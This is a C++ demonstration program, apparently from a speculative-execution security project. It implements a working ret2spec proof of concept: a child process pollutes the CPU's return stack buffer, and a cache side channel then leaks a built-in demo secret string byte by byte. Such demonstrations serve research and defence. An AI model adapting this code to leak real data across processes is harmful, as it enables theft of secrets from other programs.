/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstration of ret2spec that exploits the fact that return stack buffers
 * have limited size and they can be rewritten by recursive invocations of
 * another function by another process.
 *
 * We have two functions that we named after their constant return values. One
 * process (the attacker) calls recursively the ReturnsFalse function and yields
 * the CPU in the deepest invocation. This way it leaves the RSB full of return
 * addresses to the ReturnsFalse invocation that are absolutely unreachable from
 * the victim process.
 *
 * The victim process invokes recursively the ReturnTrue function, but before
 * each return it flushes from cache the stack frame that contains the return
 * address. The prediction uses the polluted RSB with return addresses injected
 * by the attacker and the victim jumps to architecturally unreachable code that
 * has microarchitectural side-effects.
 **/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include <sys/types.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *private_data = "It's a s3kr3t!!!";

// Recursion depth should be equal or greater than the RSB size, but not
// excessively high because of the possibility of stack overflow.
constexpr size_t kRecursionDepth = 64;
constexpr size_t kCacheLineSize = 64;

// Global variables used to avoid passing parameters through recursive function
// calls. Since we flush whole stack frames from the cache, it is important not
// to store on stack any data that might be affected by being flushed from
// cache.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

// Return value of ReturnsFalse that never changes. Avoiding compiler
// optimizations with it.
bool false_value = false;
// Pointers to stack marks in ReturnsTrue. Used for flushing the return address
// from the cache.
std::vector<char *> stack_mark_pointers;

// Always returns false. Executed only by the child.
static bool ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
      // Unreachable code. ReturnsFalse can never return true.
      const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
      ForceRead(isolated_oracle.data() +
                static_cast<unsigned char>(private_data[current_offset]));
      std::cout << "Dead code. Must not be printed." << std::endl;
      exit(EXIT_FAILURE);
    }
  } else {
    // Yield the CPU to increase the interference.
    sched_yield();
  }
  return false_value;
}

// Always returns true. Executed only by the attacker.
static bool ReturnsTrue(int counter) {
  // Creates a stack mark and stores it to the global vector.
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);

  if (counter > 0) {
    // Recursively invokes itself.
    ReturnsTrue(counter - 1);
  } else {
    // Let the other process run to increase the interference.
    sched_yield();
  }

  // Cleans-up its stack mark and flushes from the cache everything between its
  // own stack mark and the next one. Somewhere there must be also the return
  // address.
  stack_mark_pointers.pop_back();
    for (int i = 0; i < (stack_mark_pointers.back() - &stack_mark);
       i += kCacheLineSize) {
    CLFlush(&stack_mark + i);
  }
  CLFlush(stack_mark_pointers.back());
  return true;
}

static char LeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    stack_mark_pointers.push_back(&stack_mark);
    ReturnsTrue(kRecursionDepth);
    stack_mark_pointers.pop_back();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  // Parent PID for the death-checking of the child.
  pid_t ppid = getpid();
  // We need both processes to run on the same core. Pinning the parent before
  // the fork to the first core. The child inherits the settings.
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  int res = sched_setaffinity(getpid(), sizeof(set), &set);
  if (res != 0) {
    std::cout << "CPU affinity setup failed." << std::endl;
    exit(EXIT_FAILURE);
  }
  if (fork() == 0) {
    // The child (attacker) infinitely fills the RSB using recursive calls.
    while (true) {
      ReturnsFalse(kRecursionDepth);
      // If the parent pid changed, the parent is dead and it's time to
      // terminate.
      if (getppid() != ppid) {
        exit(EXIT_SUCCESS);
      }
    }
  } else {
    // The parent (victim) calls only LeakByte and ReturnTrue, never
    // ReturnFalse.
    std::cout << "Leaking the string: ";
    std::cout.flush();
    for (size_t i = 0; i < strlen(private_data); ++i) {
      current_offset = i;
      std::cout << LeakByte();
      std::cout.flush();
    }
  }
  std::cout << "\nDone!\n";
}
